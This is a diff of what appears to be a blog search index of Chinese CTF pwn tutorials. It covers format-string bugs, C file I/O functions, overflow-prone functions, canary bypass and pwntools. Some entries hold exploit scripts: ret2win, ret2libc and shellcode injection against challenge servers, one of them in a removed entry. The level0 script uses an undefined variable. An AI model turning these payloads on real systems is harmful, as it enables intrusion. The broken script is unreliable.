@@ -4,6 +4,9 @@
     <title><![CDATA[格式化字符串漏洞]]></title>
     <url>%2F2018%2F11%2F29%2F%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%2F</url>
     <content type="text"><![CDATA[0x00 什么是格式化字符串学过c语言的都知道printf，fprintf，sprintf等这一类printf函数中经常用到”%”，后面加一个或多个字符串做说明符。格式化字符串指的就是printf函数第一个参数，最常见的包括：123456%d - 十进制 - 输出十进制整数%s - 字符串 - 从内存中读取字符串%x - 十六进制 - 输出十六进制数%c - 字符 - 输出字符%p - 指针 - 指针地址%n - 到目前为止所写的字符数 printf有一个特殊的格式化控制符%n，和其他控制输出格式和内容的格式化字符不同的是，这个格式化字符会将已输出的字符数写入到对应参数的内存中。我们就利用这个漏洞实现任意地址写 0x01 漏洞原理产生漏洞的原因就是没写格式化控制符,如123char str[100];scanf(&quot;%s&quot;,str);printf(str); 事实上，这是一种非常危险的写法。由于printf函数族的设计缺陷，当其第一个参数可被控制时，攻击者将有机会对任意内存地址进行读写操作。 一般来说，每个函数的参数个数都是固定的，被调用的函数知道应该从内存中读取多少个变量，但printf是可变参数的函数，对可变参数的函数而言，一切就变得模糊了起来。函数的调用者可以自由的指定函数参数的数量和类型，被调用者无法知道在函数调用之前到底有多少参数被压入栈帧当中。所以printf函数要求传入一个format参数用以指定到底有多少，怎么样的参数被传入其中。然后它就会忠实的按照函数的调用者传入的格式一个一个的打印出数据。由于编程者的疏忽，把格式化字符串的操纵权交给用户，就会产生后面任意地址读写的漏洞。 举个栗子，主函数如下：程序很简单，可以多次输入方便调试，memset函数先把buf都初始化为0，然后read函数读取键盘操作，输入buf最后在输出buf。 正常情况下我们输入什么都会输出什么，但是当我们输入一些特定的字符时输出出现了变化。 0x02利用格式化字符串漏洞实现任意地址读]]></content>
+      <categories>
+        <category>pwn</category>
+      </categories>
       <tags>
         <tag>pwn</tag>
       </tags>
@@ -12,11 +15,20 @@
     <title><![CDATA[从非缓冲系统文件到常见栈溢出函数]]></title>
     <url>%2F2018%2F11%2F12%2F%E4%BB%8E%E9%9D%9E%E7%BC%93%E5%86%B2%E7%B3%BB%E7%BB%9F%E6%96%87%E4%BB%B6%E5%88%B0%E5%B8%B8%E8%A7%81%E6%A0%88%E6%BA%A2%E5%87%BA%E5%87%BD%E6%95%B0%2F</url>
     <content type="text"><![CDATA[非缓冲和缓冲是相对而言的了解什么是非缓冲文件系统之前，先了解一下缓冲文件系统。 什么是缓冲文件系统？程序在运行过程中，会自动在内存开辟一个“缓冲区”，为程序中的每一个文件使用，当执行读文件的操作时，从磁盘文件将数据先读入内存“缓冲区”，装满后再从内存“缓冲区”依此读入接收的变量。执行写文件的操作时，先将数据写入内存“缓冲区”，待内存“缓冲区”装满后再写入文件。由此可以看出，内存“缓冲区”的大小，影响着实际操作外存的次数，内存“缓冲区”越大，则操作外存的次数就少，执行速度就快、效率高。一般来说，文件“缓冲区”的大小随机器而定。 作用用缓冲区可以一次读入一批数据，或输出一批数据，而不是执行一次输入或输出函数就去访问一次磁盘，这样做的目的是减少对磁盘的实际读写次数。 代表函数(c语言)缓冲文件系统，fopen, fclose, fread, fwrite, fgetc, fgets, fputc, fputs, freopen, fseek, ftell, rewind等 非缓冲文件系统特点非缓冲文件系统不由系统自动设置缓冲区，而由用户自己根据需要设置。在传统的unix系统下，用缓冲文件系统来处理文本文件，用非缓冲文件系统处理二进制文件。 代表函数缓冲文件系统，open, close, read, write, gets, getchar, putc, putchar等 栈溢出常见函数 函数 功能 可利用漏洞 read() 读取文件内容到缓冲区 读到\x00和指定字节 write() 把缓冲区的内容写入到文件内 写到\x00和指定字节 gets() 从输入缓冲区中读取一个字符串存储到字符指针 可无限输入 puts() 输出字符串,相当于printf(“%s\n”,s) 输出直到\x00 strcpy() 只能复制字符串 一直复制直到遇到\x00 memcpy() 复制任意内容 指定字节 strncpy() 复制指定字节字符 指定字节 printf() 格式化输出 输出直到\x00 scanf() 格式化输入 输入与定义不同的类型或输入多与定义的数组元素 下面是详细内容: 0x00 read()函数原型12#include &lt;unistd.h&gt;ssize_t read (int fd, void *buf, size_t nbyte) fd：文件描述符；fd为0从键盘读取buf：指定的缓冲区，即指针，指向一段内存单元；nbyte：要读入文件指定的字节数； 功能read()会把参数fd所指的文件传送nbyte个字节到buf指针所指的内存中。若参数nbyte为0，则read()不会有作用并返回0。 返回值成功时,read返回实际所读的字节数,如果返回的值是0,表示已经读到文件的结束了.小于0表示出现了错误.如果错误为EINTR说明读是由中断引起的, 如果是ECONNREST表示网络连接出了问题. 0x01 write()函数原型12#include &lt;unistd.h&gt;ssize_t write(int fd,const void *buf,size_t nbytes) fd：文件描述符；fd为1输出到显示器buf：指定的缓冲区，即指针，指向一段内存单元；nbyte：要写入文件指定的字节数； 功能write()会把参数buf 所指的内存写入nbytes 个字节到参数fd 所指的文件内. 当然, 文件读写位置也会随之移动. 返回值如果顺利write()会返回实际写入的字节数.当有错误发生时则返回-1, 错误代码存入errno 中. 错误代码： EINTR 此调用被信号所中断. EAGAIN 当使用不可阻断I/O 时 (O_NONBLOCK), 若无数据可读取则返回此值. EADF 参数fd 非有效的文件描述词, 或该文件已关闭 0x02 gets()函数原型12# include &lt;stdio.h&gt;char *gets(char *str); 功能gets() 函数的功能是从输入缓冲区中读取一个字符串存储到字符指针变量 str 所指向的内存空间。 注意使用 gets() 时，系统会将最后“敲”的换行符从缓冲区中取出来，然后丢弃，所以缓冲区中不会遗留换行符。这就意味着，如果前面使用过 gets()，而后面又要从键盘给字符变量赋值的话就不需要吸收回车清空缓冲区了，因为缓冲区的回车已经被 gets() 取出来扔掉了 gets() 时有空格也可以直接输入，但是 gets() 有一个非常大的缺陷，即它不检查预留存储区是否能够容纳实际输入的数据，换句话说，如果输入的字符数目大于数组的长度，gets 无法检测到这个问题，就会发生内存越界。 0x03 strcpy()和memcpy()和strncpy()函数原型123char* strcpy(char* dest, const char* src)void *memcpy( void *dest, const void *src, size_t count );char *strncpy(char *dest,char *src,int size_t n); dest:指向用于存储复制内容的目标数组。src:要复制的字符串。count：要读入文件指定的字节数； 注意 strcpy提供了字符串的复制。即strcpy只用于字符串复制，并且它不仅复制字符串内容之外，还会复制字符串的结束符’\0’。 复制的内容不同。strcpy只能复制字符串，而memcpy可以复制任意内容，例如字符数组、整型、结构体、类等。 复制的方法不同。strcpy不需要指定长度，它遇到被复制字符的串结束符”\0”才结束，所以容易溢出。memcpy则是根据其第3个参数决定复制的长度。 用途不同。通常在复制字符串时用strcpy，而需要复制其他类型数据时则一般用memcpy strncpy函数，只是将src的前n个字符复制到dest的前n个字符，不自动添加’\0’。如果src的长度小于n个字节，则以NULL填充dest直到复制完n个字节 0x04 printf()和scanf()引入：华为的一道经典面试 i的值输出是多少呢，没有考虑栈溢出的话，i就是5。可这里栈溢出了，i=6776421 ，这是为什么呢？进入到内存中分析：连续定义的变量，内存地址一般也相邻首先依次在栈区为变量开辟空间（注意方式，整形是4个字节以计算，char型一字节一计算）a,b,c,d,e对应的ASCII码对照表的16进制为0x61,0x62,0x63,0x64,0x65 越界后： 所以最后的结果是0x676665的十进制6776421]]></content>
+      <categories>
+        <category>pwn</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+      </tags>
   </entry>
   <entry>
     <title><![CDATA[open、fopen和popen]]></title>
     <url>%2F2018%2F11%2F07%2Fopen%E3%80%81fopen%E5%92%8Cpopen%2F</url>
     <content type="text"><![CDATA[open简介打开设备文件不带缓冲区非缓冲文件系统依赖于操作系统，通过操作系统的功能对文件进行读写，是系统级的输入输出，它不设文件结构体指针，只能读写二进制文件，但效率高、速度 快 函数原型1234567int open(const char *pathname, int flags);int open(const char *pathname, int flags, mode_t mode);所需库：#include &lt;sys/types.h&gt; #include &lt;sys/stat.h&gt; #include &lt;fcntl.h&gt; 返回值成功则返回文件描述符，否则返回 -1; 参数说明参数 pathname 指向欲打开的文件路径字符串. 下列是参数flags 所能使用的旗标: O_RDONLY 以只读方式打开文件 O_WRONLY 以只写方式打开文件 O _RDWR 以可读写方式打开文件. 上述三种旗标是互斥的, 也就是不可同时使用, 但可与下列的旗标利用OR(|)运算符组合. O_CREAT 若欲打开的文件不存在则自动建立该文件. O_EXCL 如果O_CREAT 也被设置, 此指令会去检查文件是否存在. 文件若不存在则建立该文件, 否则将导致打开文件错误. 此外, 若O_CREAT 与O_EXCL 同时设置, 并且欲打开的文件为符号连接, 则会打开文件失败. O_NOCTTY 如果欲打开的文件为终端机设备时, 则不会将该终端机当成进程控制终端机. O_TRUNC 若文件存在并且以可写的方式打开时, 此旗标会令文件长度清为0, 而原来存于该文件的资料也会消失. O_APPEND 当读写文件时会从文件尾开始移动, 也就是所写入的数据会以附加的方式加入到文件后面. O_NONBLOCK 以不可阻断的方式打开文件, 也就是无论有无数据读取或等待, 都会立即返回进程之中. O_NDELAY 同O_NONBLOCK. O_SYNC 以同步的方式打开文件. O_NOFOLLOW 如果参数pathname 所指的文件为一符号连接, 则会令打开文件失败. O_DIRECTORY 如果参数pathname 所指的文件并非为一目录, 则会令打开文件失败。注：此为Linux2. 2 以后特有的旗标, 以避免一些系统安全问题. 参数mode 则有下列数种组合, 只有在建立新文件时才会生效, 此外真正建文件时的权限会受到umask 值所影响, 因此该文件权限应该为 (mode-umaks). S_IRWXU00700 权限, 代表该文件所有者具有可读、可写及可执行的权限. S_IRUSR 或S_IREAD, 00400 权限, 代表该文件所有者具有可读取的权限. S_IWUSR 或S_IWRITE, 00200 权限, 代表该文件所有者具有可写入的权限. S_IXUSR 或S_IEXEC, 00100 权限, 代表该文件所有者具有可执行的权限. S_IRWXG 00070 权限, 代表该文件用户组具有可读、可写及可执行的权限. S_IRGRP 00040 权限, 代表该文件用户组具有可读的权限. S_IWGRP 00020 权限, 代表该文件用户组具有可写入的权限. S_IXGRP 00010 权限, 代表该文件用户组具有可执行的权限. S_IRWXO 00007 权限, 代表其他用户具有可读、可写及可执行的权限. S_IROTH 00004 权限, 代表其他用户具有可读的权限 S_IWOTH 00002 权限, 代表其他用户具有可写入的权限. S_IXOTH 00001 权限, 代表其他用户具有可执行的权限. 返回值：若所有欲核查的权限都通过了检查则返回0 值, 表示成功, 只要有一个权限被禁止则返回-1. 错误代码： EEXIST 参数pathname 所指的文件已存在, 却使用了O_CREAT 和-O_EXCL 旗标. EACCESS 参数pathname 所指的文件不符合所要求测试的权限. EROFS 欲测试写入权限的文件存在于只读文件系统内. EFAULT 参数pathname 指针超出可存取内存空间. EINVAL 参数mode 不正确. ENAMETOOLONG 参数 pathname 太长. ENOTDIR 参数pathname 不是目录. ENOMEM 核心内存不足. ELOOP 参数pathname 有过多符号连接问题. EIO I/O 存取错误. fopen简介打开普通文件带缓冲区缓冲文件系统是借助文件结构体指针来对文件进行管理，通过文件指针来对文件进行访问，既可以读写字符、字符串、格式化数据，也可以读写二进制数据。 函数原型12#include&lt;stdio.h&gt;FILE * fopen(const char * path,const char * mode); 返回值文件顺利打开后，指向该流的文件指针就会被返回。如果文件打开失败则返回NULL，并把错误代码存在errno 中。 参数说明参数path字符串包含欲打开的文件路径及文件名，参数mode字符串则代表着流形态。mode有下列几种形态字符串:r 以只读方式打开文件，该文件必须存在。r+ 以可读写方式打开文件，该文件必须存在。rb+ 读写打开一个二进制文件，允许读写数据。rw+ 读写打开一个文本文件，允许读和写。w 打开只写文件，若文件存在则文件长度清为0，即该文件内容会消失。若文件不存在则建立该文件。w+ 打开可读写文件，若文件存在则文件长度清为零，即该文件内容会消失。若文件不存在则建立该文件。a 以附加的方式打开只写文件。若文件不存在，则会建立该文件，如果文件存在，写入的数据会被加到文件尾，即文件原先的内容会被保留。（EOF符保留）a+ 以附加方式打开可读写的文件。若文件不存在，则会建立该文件，如果文件存在，写入的数据会被加到文件尾后，即文件原先的内容会被保留。 （原来的EOF符不保留）wb 只写打开或新建一个二进制文件；只允许写数据。wb+ 读写打开或建立一个二进制文件，允许读和写。ab+ 读写打开一个二进制文件，允许读或在文件末追加数据。at+ 打开一个叫string的文件，a表示append,就是说写入处理的时候是接着原来文件已有内容写入，不是从头写入覆盖掉，t表示打开文件的类型是文本文件，+号表示对文件既可以读也可以写。上述的形态字符串都可以再加一个b字符，如rb、w+b或ab+等组合，加入b 字符用来告诉函数库以二进制模式打开文件。如果不加b，表示默认加了t，即rt,wt,其中t表示以文本模式打开文件。由fopen()所建立的新文件会具有S_IRUSR|S_IWUSR|S_IRGRP|S_IWGRP|S_IROTH|S_IWOTH(0666)权限，此文件权限也会参考umask 值。有些C编译系统可能不完全提供所有这些功能，有的C版本不用”r+”,”w+”,”a+”,而用”rw”,”wr”,”ar”等，读者注意所用系统的规定。 popen函数原型12#include&lt;stdio.h&gt;FILE * popen ( const char * command , const char * type ); 返回值如果调用 fork() 或 pipe() 失败，或者不能分配内存将返回NULL，否则返回标准 I/O 流。 参数说明type 参数只能是读或者写中的一种，得到的返回值（标准 I/O 流）也具有和 type 相应的只读或只写类型。如果 type 是 “r” 则文件指针连接到 command 的标准输出；如果 type 是 “w” 则文件指针连接到 command 的标准输入。command 参数是一个指向以 NULL 结束的 shell 命令字符串的指针。这行命令将被传到 bin/sh 并使用-c 标志，shell 将执行这个命令。]]></content>
+      <categories>
+        <category>c</category>
+      </categories>
       <tags>
         <tag>c</tag>
       </tags>
@@ -25,54 +37,64 @@
     <title><![CDATA[缓冲文件系统和非缓冲文件系统]]></title>
     <url>%2F2018%2F11%2F05%2F%E7%BC%93%E5%86%B2%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%92%8C%E9%9D%9E%E7%BC%93%E5%86%B2%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%2F</url>
     <content type="text"><![CDATA[前言1983 年ANSI C 标准决定不采用非缓冲文件系统，而只采用缓冲文件系统。即用缓冲文件系统处理文本文件，也用它来处理二进制文件。也就是将缓冲文件系统扩充为可以处理二进制文件。 缓冲文件系统特点自动在内存开辟一个“缓冲区”，为程序中的每一个文件使用，当执行读文件的操作时，从磁盘文件将数据先读入内存“缓冲区”，装满后再从内存“缓冲区”依此读入接收的变量。执行写文件的操作时，先将数据写入内存“缓冲区”，待内存“缓冲区”装满后再写入文件。由此可以看出，内存“缓冲区”的大小，影响着实际操作外存的次数，内存“缓冲区”越大，则操作外存的次数就少，执行速度就快、效率高。一般来说，文件“缓冲区”的大小随机器而定。 作用用缓冲区可以一次读入一批数据，或输出一批数据，而不是执行一次输入或输出函数就去访问一次磁盘，这样做的目的是减少对磁盘的实际读写次数。 代表函数缓冲文件系统，fopen, fclose, fread, fwrite, fgetc, fgets, fputc, fputs, freopen, fseek, ftell, rewind等 非缓冲文件系统特点非缓冲文件系统不由系统自动设置缓冲区，而由用户自己根据需要设置。在传统的unix系统下，用缓冲文件系统来处理文本文件，用非缓冲文件系统处理二进制文件。 代表函数缓冲文件系统，open, close, read, write, gets, getchar, putc, putchar等]]></content>
+      <categories>
+        <category>linux</category>
+      </categories>
       <tags>
-        <tag>c</tag>
+        <tag>linux</tag>
       </tags>
   </entry>
   <entry>
     <title><![CDATA[栈溢出常见函数]]></title>
     <url>%2F2018%2F11%2F04%2F%E6%A0%88%E6%BA%A2%E5%87%BA%E5%B8%B8%E8%A7%81%E5%87%BD%E6%95%B0%2F</url>
     <content type="text"><![CDATA[0x00 read()函数原型12#include &lt;unistd.h&gt;ssize_t read (int fd, void *buf, size_t nbyte) fd：文件描述符；fd为0从键盘读取buf：指定的缓冲区，即指针，指向一段内存单元；nbyte：要读入文件指定的字节数； 功能read()会把参数fd所指的文件传送nbyte个字节到buf指针所指的内存中。若参数nbyte为0，则read()不会有作用并返回0。 返回值成功时,read返回实际所读的字节数,如果返回的值是0,表示已经读到文件的结束了.小于0表示出现了错误.如果错误为EINTR说明读是由中断引起的, 如果是ECONNREST表示网络连接出了问题. 0x01 write()函数原型12#include &lt;unistd.h&gt;ssize_t write(int fd,const void *buf,size_t nbytes) fd：文件描述符；fd为1输出到显示器buf：指定的缓冲区，即指针，指向一段内存单元；nbyte：要写入文件指定的字节数； 功能write()会把参数buf 所指的内存写入nbytes 个字节到参数fd 所指的文件内. 当然, 文件读写位置也会随之移动. 返回值如果顺利write()会返回实际写入的字节数.当有错误发生时则返回-1, 错误代码存入errno 中. 错误代码： EINTR 此调用被信号所中断. EAGAIN 当使用不可阻断I/O 时 (O_NONBLOCK), 若无数据可读取则返回此值. EADF 参数fd 非有效的文件描述词, 或该文件已关闭 0x02 gets()函数原型12# include &lt;stdio.h&gt;char *gets(char *str); 功能gets() 函数的功能是从输入缓冲区中读取一个字符串存储到字符指针变量 str 所指向的内存空间。 注意使用 gets() 时，系统会将最后“敲”的换行符从缓冲区中取出来，然后丢弃，所以缓冲区中不会遗留换行符。这就意味着，如果前面使用过 gets()，而后面又要从键盘给字符变量赋值的话就不需要吸收回车清空缓冲区了，因为缓冲区的回车已经被 gets() 取出来扔掉了 gets() 时有空格也可以直接输入，但是 gets() 有一个非常大的缺陷，即它不检查预留存储区是否能够容纳实际输入的数据，换句话说，如果输入的字符数目大于数组的长度，gets 无法检测到这个问题，就会发生内存越界。 0x03 strcpy()和memcpy()和strncpy()函数原型123char* strcpy(char* dest, const char* src)void *memcpy( void *dest, const void *src, size_t count );char *strncpy(char *dest,char *src,int size_t n); dest:指向用于存储复制内容的目标数组。src:要复制的字符串。count：要读入文件指定的字节数； 注意 strcpy提供了字符串的复制。即strcpy只用于字符串复制，并且它不仅复制字符串内容之外，还会复制字符串的结束符’\0’。 复制的内容不同。strcpy只能复制字符串，而memcpy可以复制任意内容，例如字符数组、整型、结构体、类等。 复制的方法不同。strcpy不需要指定长度，它遇到被复制字符的串结束符”\0”才结束，所以容易溢出。memcpy则是根据其第3个参数决定复制的长度。 用途不同。通常在复制字符串时用strcpy，而需要复制其他类型数据时则一般用memcpy strncpy函数，只是将src的前n个字符复制到dest的前n个字符，不自动添加’\0’。如果src的长度小于n个字节，则以NULL填充dest直到复制完n个字节 0x04 printf()和scanf()scanf函数scanf(“%d %d”,&amp;a,&amp;b);遇到空格(0x20)停止读取 printf函数printf(“%s”, i);输出直到\x00 格式化字符串漏洞通常来说，我们会使用printf([格式化字符串]，参数)的形式来进行调用，例如12char s[20] = “Hello world!\n”;printf(“%s”, s); 然而，有时候为了省事也会写成12char s[20] = “Hello world!\n”;printf(s); 事实上，这是一种非常危险的写法。由于printf函数族的设计缺陷，当其第一个参数可被控制时，攻击者将有机会对任意内存地址进行读写操作。]]></content>
+      <categories>
+        <category>pwn</category>
+      </categories>
       <tags>
-        <tag>c ctf pwn</tag>
+        <tag>pwn</tag>
       </tags>
   </entry>
   <entry>
     <title><![CDATA[stack canary绕过思路]]></title>
     <url>%2F2018%2F10%2F24%2Fstack-canary%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%2F</url>
     <content type="text"><![CDATA[0x00 canary保护机制我们知道，通常栈溢出的利用方式是通过溢出存在于栈上的局部变量，从而让多出来的数据覆盖ebp、eip等，从而达到劫持控制流的目的。然而stack canary这一技术的应用使得这种利用手段变得难以实现。 canary保护机制是在栈保护上则是在初始化一个栈帧时在栈底设置一个随机的canary值（最后两位必须是00），栈帧销毁前测试该值是否“死掉”，即是否被改变，若被改变则说明栈溢出发生，程序走另一个流程结束，以免漏洞利用成功。 如图var-c就是canary的地址，如果触发了栈溢出漏洞，还不知道canary的值，就会执行__stack_chk_fail函数。 0x01 泄露canary泄露canary的方法有： 通过格式化字符串漏洞来泄露canary的值 通过栈溢出漏洞来泄露canary的值 多进程程序的canary爆破 利用__stack_chk_fail函数泄露信息当然具体问题还要具体分析 未完待续。。。]]></content>
+      <categories>
+        <category>pwn</category>
+      </categories>
       <tags>
-        <tag>ctf pwn</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[萌新赛]]></title>
-    <url>%2F2018%2F10%2F13%2F%E4%B8%AD%E5%B7%A5%E8%90%8C%E6%96%B0%E8%B5%9B%2F</url>
-    <content type="text"><![CDATA[第一题 下载文件之后拖到IDA里看下，发现callsystem函数，那就简单了主函数如下 callsystem地址： 写出脚本：123456789from pwn import *s_addr=0x400596p=remote(&quot;120.79.51.146&quot;,10000)p.sendline(&apos;a&apos;*0x80+&apos;a&apos;*8+p64(s_addr))p.interactive() 第二题 拖到IDA没有（/bin/sh),也没有system函数，文件中给出了libc库，那就用吧脚本如下：123456789101112131415161718192021222324252627from pwn import *context.log_level=&quot;debug&quot;p=remote(&quot;120.79.51.146&quot;,10002)elf=ELF(&quot;rop32&quot;)main_addr=0x08048460plt_write=elf.plt[&quot;write&quot;]payload = &quot;A&quot; * 0x88 + &quot;A&quot; * 4 + p32(plt_write) + p32(main_addr) + p32(1) + p32(elf.got[&quot;write&quot;]) + p32(4)p.send(payload)write_addr=u32(p.recv(4))print &quot;write_addr=&quot;+hex(write_addr)libc=ELF(&quot;libc6.so&quot;)libc_system=libc.symbols[&quot;system&quot;]libc_binsh=next(libc.search(&quot;/bin/sh&quot;))libc_write=libc.symbols[&quot;write&quot;]system_addr=write_addr-libc_write+libc_systembinsh_addr=write_addr-libc_write+libc_binshprint &quot;system_addr=&quot;+hex(system_addr)raw_input()payload = &quot;A&quot; * 0x88 + &quot;A&quot; * 4 + p32(system_addr) + p32(0x77) + p32(binsh_addr)p.sendline(payload)p.interactive()]]></content>
-      <tags>
-        <tag>ctf</tag>
+        <tag>pwn</tag>
       </tags>
   </entry>
   <entry>
     <title><![CDATA[oj level0和level1总结]]></title>
     <url>%2F2018%2F09%2F21%2Foj-level0%E5%92%8Clevel1%E6%80%BB%E7%BB%93%2F</url>
-    <content type="text"><![CDATA[仅献给刚入门的菜鸟，大佬请绕过 做题之前，需要知道pwntools的基本用法，如下：123456789from pwn import *context(arch = &apos;i386&apos;, os = &apos;linux&apos;) ;设置目标机的信息r = remote(&apos;exploitme.example.com&apos;, 31337) ;用来建立一个远程连接，url或者ip作为地址 然后指明端口,这里也可以仅仅使用本地文件,调试时方便:r.send(asm(shellcraft.sh())) ;r.send()将shellcode发送到远程连接r.interactive() ;将控制权交给用户，这样就可以使用打开的shell了 ps：具体的可以看我的另一篇博客 还需要知道pwn的一般套路，这里我只说说栈溢出的基本套路： 找到栈溢出地址（就是搞事情的地址），基本上都是buf的地址，这个地址需要用pwntools中的p32或p64进行转换，（若程序是32位的就用p32）才能用pwntools中的sendline发送到远程连接 构建shellcode，用一句话就行shellcode = asm(shellcraft.sh()) 构建payload，payload的基本构建：payload=shellcode+’a’*一个长度+p32(buf_addr)，次序一定不能乱 最后就可以发送payload，进行交互，得到shell的控制权，然后ls ，cat flag level0的脚本如下：1234567from pwn import *s_addr=0x400596r=remote(&quot;pwn2.jarvisoj.com&quot;,9881)p.sendline(&apos;a&apos;*0x80+&apos;a&apos;*8+p64(s_addr))p.interactive() 解释如下：level0是最简单的也是最基本的，这个题有一个函数callsystem，直接返回一个system（”/bin/sh”)也就是返回一个命令框，这就是我们想要的，所以不用构建shellcode和paload了脚本里的’a’0x80+’a’8代表的是如下图的两个数据，0x80是申请的总共地址，而8在buf的最下方 s_addr=0x400596代表的是函数callsystem的地址 level1的脚本如下：12345678910111213from pwn import *context(log_level = &apos;debug&apos;, arch = &apos;i386&apos;, os = &apos;linux&apos;)shellcode = asm(shellcraft.sh())io = remote(&apos;pwn2.jarvisoj.com&apos;, 9877)text = io.recvline()[14: -2]buf_addr = int(text, 16)payload = shellcode + &apos;a&apos; * (0x88 + 0x4 - len(shellcode)) + p32(buf_addr)io.send(payload)io.interactive()io.close() 解释如下：这里我只解释主要思路不明白如下两句话的可以百度12context(log_level = &apos;debug&apos;, arch = &apos;i386&apos;, os = &apos;linux&apos;)shellcode = asm(shellcraft.sh()) [14:-2]只是python里面的一个切片，代表”What’sthis:0xffee6c50?”这句话取第14个到倒数第二个字符这里的text为buf的地址，只不过是字符型的，需要int（text，16）用16进制的方法转化为int型 相比level0，这里多加了一个shellcode，和多减了一个len（shellcode）,shellcode和p32（buf_addr)的值如下图然后就需要慢慢理解了，为什么这么操作很多时候我们都只是知道怎么去做，但不知道为什么这样做，等以后我懂原理了，在补上解释吧。]]></content>
+    <content type="text"><![CDATA[做题之前，需要知道pwntools的基本用法，如下：123456789from pwn import *context(arch = &apos;i386&apos;, os = &apos;linux&apos;) ;设置目标机的信息r = remote(&apos;exploitme.example.com&apos;, 31337) ;用来建立一个远程连接，url或者ip作为地址 然后指明端口,这里也可以仅仅使用本地文件,调试时方便:r.send(asm(shellcraft.sh())) ;r.send()将shellcode发送到远程连接r.interactive() ;将控制权交给用户，这样就可以使用打开的shell了 ps：具体的可以看我的另一篇博客 还需要知道pwn的一般套路，这里我只说说栈溢出的基本套路： 找到栈溢出地址（就是搞事情的地址），基本上都是buf的地址，这个地址需要用pwntools中的p32或p64进行转换，（若程序是32位的就用p32）才能用pwntools中的sendline发送到远程连接 构建shellcode，用一句话就行shellcode = asm(shellcraft.sh()) 构建payload，payload的基本构建：payload=shellcode+’a’*一个长度+p32(buf_addr)，次序一定不能乱 最后就可以发送payload，进行交互，得到shell的控制权，然后ls ，cat flag level0的脚本如下：1234567from pwn import *s_addr=0x400596r=remote(&quot;pwn2.jarvisoj.com&quot;,9881)p.sendline(&apos;a&apos;*0x80+&apos;a&apos;*8+p64(s_addr))p.interactive() 解释如下：level0是最简单的也是最基本的，这个题有一个函数callsystem，直接返回一个system（”/bin/sh”)也就是返回一个命令框，这就是我们想要的，所以不用构建shellcode和paload了脚本里的’a’0x80+’a’8代表的是如下图的两个数据，0x80是申请的总共地址，而8在buf的最下方 s_addr=0x400596代表的是函数callsystem的地址 level1的脚本如下：12345678910111213from pwn import *context(log_level = &apos;debug&apos;, arch = &apos;i386&apos;, os = &apos;linux&apos;)shellcode = asm(shellcraft.sh())io = remote(&apos;pwn2.jarvisoj.com&apos;, 9877)text = io.recvline()[14: -2]buf_addr = int(text, 16)payload = shellcode + &apos;a&apos; * (0x88 + 0x4 - len(shellcode)) + p32(buf_addr)io.send(payload)io.interactive()io.close() 解释如下：这里我只解释主要思路不明白如下两句话的可以百度12context(log_level = &apos;debug&apos;, arch = &apos;i386&apos;, os = &apos;linux&apos;)shellcode = asm(shellcraft.sh()) [14:-2]只是python里面的一个切片，代表”What’sthis:0xffee6c50?”这句话取第14个到倒数第二个字符这里的text为buf的地址，只不过是字符型的，需要int（text，16）用16进制的方法转化为int型]]></content>
+      <categories>
+        <category>pwn</category>
+      </categories>
       <tags>
-        <tag>ctf pwn</tag>
+        <tag>pwn</tag>
       </tags>
   </entry>
   <entry>
     <title><![CDATA[pwntools]]></title>
     <url>%2F2018%2F09%2F19%2Fpwntools%2F</url>
     <content type="text"><![CDATA[pwntoolspwntools是一个ctf框架和漏洞利用开发库，用python开发，旨在让使用者简单快速的编写exploit。python2安装方法： sudo pip install pwntoolspython3安装方法： sudo pip3 install pwntools IO模块下面给出了PwnTools中的主要IO函数。1234567891011send(data) : 发送数据sendline(data) : 发送一行数据，相当于在末尾加\nrecv(numb=4096, timeout=default) : 给出接收字节数,timeout指定超时recvuntil(delims, drop=False) : 接收到delims的pattern（以下可以看作until的特例）recvline(keepends=True) : 接收到\n，keepends指定保留\nrecvall() : 接收到EOFrecvrepeat(timeout=default) : 接收到EOF或timeoutinteractive() : 与shell交互 ELF模块ELF模块用于获取ELF文件的信息，首先使用ELF()获取这个文件的句柄，然后使用这个句柄调用函数，和IO模块很相似。 下面演示了：获取基地址、获取函数地址（基于符号）、获取函数got地址、获取函数plt地址123456789&gt;&gt;&gt; e = ELF(&apos;/bin/cat&apos;)&gt;&gt;&gt; print hex(e.address) # 文件装载的基地址0x400000&gt;&gt;&gt; print hex(e.symbols[&apos;write&apos;]) # 函数地址0x401680&gt;&gt;&gt; print hex(e.got[&apos;write&apos;]) # GOT表的地址0x60b070&gt;&gt;&gt; print hex(e.plt[&apos;write&apos;]) # PLT的地址0x401680 数据处理主要是对整数进行打包，就是转换成二进制的形式，比如转换成地址。p32、p64是打包，u32、u64是解包。数据打包,即将整数值转换为32位或者64位地址一样的表示方式,比如0x400010表示为\x10\x00\x40一样,这使得我们构造payload变得很方便 用法: p32/p64: 打包一个整数,分别打包为32或64位 u32/u64: 解包一个字符串,得到整数 大致框架官网的一个简单样例 123456789from pwn import *context(arch = &apos;i386&apos;, os = &apos;linux&apos;) ;设置目标机的信息r = remote(&apos;exploitme.example.com&apos;, 31337) ;用来建立一个远程连接，url或者ip作为地址 然后指明端口,这里也可以仅仅使用本地文件,调试时方便:r.send(asm(shellcraft.sh())) ;r.send()将shellcode发送到远程连接r.interactive() ;将控制权交给用户，这样就可以使用打开的shell了 Context设置context是pwntools用来设置环境的功能。在很多时候，由于二进制文件的情况不同，我们可能需要进行一些环境设置才能够正常运行exp，比如有一些需要进行汇编，但是32的汇编和64的汇编不同，如果不设置context会导致一些问题。 一般来说我们设置context只需要简单的一句话: context(os=’linux’, arch=’amd64’, log_level=’debug’) 这句话的意思是： os设置系统为linux系统，在完成ctf题目的时候，大多数pwn题目的系统都是linux arch设置架构为amd64，可以简单的认为设置为64位的模式，对应的32位模式是’i386’ log_level设置日志输出的等级为debug，这句话在调试的时候一般会设置，这样pwntools会将完整的io过程都打印下来，使得调试更加方便，可以避免在完成CTF题目时出现一些和IO相关的错误。 汇编与shellcode有的时候我们需要在写exp的时候用到简单的shellcode，pwntools提供了对简单的shellcode的支持。首先，常用的，也是最简单的shellcode，即调用/bin/sh可以通过shellcraft得到： 注意，由于各个平台，特别是32位和64位的shellcode不一样，所以最好先设置context。1print(shellcraft.sh()) # 打印出shellcode 